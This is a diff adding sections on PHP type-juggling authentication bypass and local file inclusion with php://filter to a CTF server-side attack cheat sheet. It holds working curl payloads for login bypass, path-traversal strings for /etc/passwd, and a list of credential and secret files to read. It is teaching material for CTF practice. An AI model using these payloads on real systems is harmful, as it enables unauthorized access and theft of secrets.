@@ -1,6 +1,8 @@
 # CTF Web - Server-Side Attacks
 
 ## Table of Contents
+- [PHP Type Juggling](#php-type-juggling-ctf101)
+- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter-ctf101)
 - [SQL Injection](#sql-injection)
   - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
   - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
@@ -49,6 +51,92 @@
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
 - [SSRF → Docker API RCE Chain (H7CTF 2025)](#ssrf--docker-api-rce-chain-h7ctf-2025)
+
+---
+
+## PHP Type Juggling (CTF101)
+
+**Pattern:** PHP loose comparison (`==`) performs implicit type conversion, leading to unexpected equality results that bypass authentication and validation checks.
+
+**Comparison table (all `true` with `==`):**
+| Comparison | Result | Why |
+|-----------|--------|-----|
+| `0 == "php"` | `true` | Non-numeric string converts to `0` |
+| `0 == ""` | `true` | Empty string converts to `0` |
+| `"0" == false` | `true` | `"0"` is falsy |
+| `NULL == false` | `true` | Both falsy |
+| `NULL == ""` | `true` | Both falsy |
+| `NULL == array()` | `true` | Both empty |
+| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |
+
+**Auth bypass with type juggling:**
+```php
+// Vulnerable: if ($input == $password)
+// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
+// md5("240610708") = "0e462097431906509019562988736854"
+// md5("QNKCDZO")  = "0e830400451993494058024219903391"
+// Both compare as 0 == 0 → true
+```
+
+**Exploit via JSON type confusion:**
+```bash
+# Send integer 0 instead of string to bypass strcmp/==
+curl -X POST http://target/login \
+  -H 'Content-Type: application/json' \
+  -d '{"password": 0}'
+# PHP: 0 == "any_non_numeric_string" → true
+```
+
+**Array bypass for strcmp:**
+```bash
+# strcmp(array, string) returns NULL, which == 0 == false
+curl http://target/login -d 'password[]=anything'
+# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
+```
+
+**Prevention:** Use strict comparison (`===`) which checks both value and type.
+
+**Key insight:** Always test `0`, `""`, `NULL`, `[]`, and `"0e..."` magic hash values against PHP comparison endpoints. JSON `Content-Type` allows sending integer `0` where the application expects a string.
+
+---
+
+## PHP File Inclusion / php://filter (CTF101)
+
+**Pattern:** PHP `include`, `require`, `require_once` accept dynamic paths. Combined with `php://filter`, leak source code without execution.
+
+**Basic LFI:**
+```php
+// Vulnerable: include($_GET['page'] . ".php");
+// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
+// Modern: page=php://filter/convert.base64-encode/resource=index
+```
+
+**Source code disclosure via php://filter:**
+```bash
+# Base64-encode prevents PHP execution, leaks raw source
+curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
+# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
+echo "PD9waHAg..." | base64 -d
+# Output: <?php $password = "s3cr3t"; ...
+```
+
+**Filter chains for RCE (PHP >= 7):**
+```bash
+# Chain convert filters to write arbitrary content
+php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
+```
+
+**Common LFI targets:**
+```
+/etc/passwd                          # User enumeration
+/proc/self/environ                   # Environment variables (secrets)
+/proc/self/cmdline                   # Process command line
+/var/log/apache2/access.log          # Log poisoning vector
+/var/www/html/config.php             # Application secrets
+php://filter/convert.base64-encode/resource=index  # Source code
+```
+
+**Key insight:** `php://filter/convert.base64-encode/resource=` is the most reliable way to read PHP source code through an LFI — base64 encoding prevents the included file from being executed as PHP.
 
 ---
 
